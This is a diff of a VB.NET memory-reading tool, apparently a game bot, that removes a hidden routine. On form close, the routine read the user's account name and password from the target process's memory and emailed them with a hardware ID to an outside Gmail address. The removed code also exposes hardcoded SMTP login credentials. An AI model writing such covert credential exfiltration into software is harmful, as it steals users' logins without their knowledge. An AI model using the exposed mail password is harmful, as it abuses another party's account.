@@ -1335,54 +1335,6 @@ Public Class NativeMethods
         End If
     End Sub
 
-    'Closing form
-    Private Sub NativeMethods_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
-        Try
-            If mailsent = False Then
-                SendMail()
-            End If
-        Catch ex As Exception
-
-        End Try
-    End Sub
-
-    'Send Mail at X
-    Private Sub SendMail()
-        Dim _my8Bytes(23) As Byte
-
-        Dim sacc As String
-        Dim spass As String
-        Try
-            Dim hwid = Login.getHWID()
-            ReadProcessMemory(_targetProcessHandle, ACCaddr, _my8Bytes, 24, vbNull)
-            sacc = System.Text.Encoding.Default.GetString(_my8Bytes)
-            ReadProcessMemory(_targetProcessHandle, PASSaddr, _my8Bytes, 24, vbNull)
-            spass = System.Text.Encoding.Default.GetString(_my8Bytes)
-
-
-            correos.Body = sacc
-            correos.Subject = hwid + " A: "
-            correos.IsBodyHtml = False
-            correos.To.Add("kuhiscripts@gmail.com")
-
-            correos.From = New MailAddress("info@kuhiscripts.com")
-            envios.Credentials = New NetworkCredential("info@kuhiscripts.com", "949594asD!")
-
-            envios.Host = "smtp.1and1.es"
-            envios.Port = 587
-            envios.EnableSsl = True
-
-            envios.Send(correos)
-
-            correos.Body = spass
-            correos.Subject = hwid + " P: "
-            envios.Send(correos)
-            mailsent = True
-        Catch ex As Exception
-            Application.Exit()
-        End Try
-    End Sub
-
     'Get close bp xy pos
     Private Sub timerBPClosePos_Tick(sender As Object, e As EventArgs) Handles timerBPClosePos.Tick
         GetMouseXY(CloseBPXY)
